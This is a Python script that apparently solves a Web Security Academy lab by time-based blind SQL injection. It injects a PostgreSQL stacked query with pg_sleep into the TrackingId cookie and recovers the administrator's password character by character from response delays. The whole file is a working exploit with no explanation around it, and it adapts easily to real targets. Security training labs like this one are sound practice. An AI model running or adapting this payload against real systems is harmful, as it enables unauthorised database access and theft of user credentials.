import requests

len_password=20
host='http://0a96008804637cf2c093efdd000f0096.web-security-academy.net/'
cookies = {'TrackingId': 'a', 'session': 'OAdNNdXedgMwEVRd6H6I1kgZYpAs0dRY'}

password = ''

all_characters = 'a1234567890qwertyuiopsdfghjklzxcvbnm'

for i in range(1, len_password + 1):
    for c in all_characters:
        cookies.update({'TrackingId': f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{c}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"})
        resp = requests.get(host, cookies=cookies)
        print(resp.request.headers)
        print(c + ":" + str(resp.elapsed.total_seconds()))
        if resp.elapsed.total_seconds() > 10:
            password += c
            print('Password:' + password)
            break
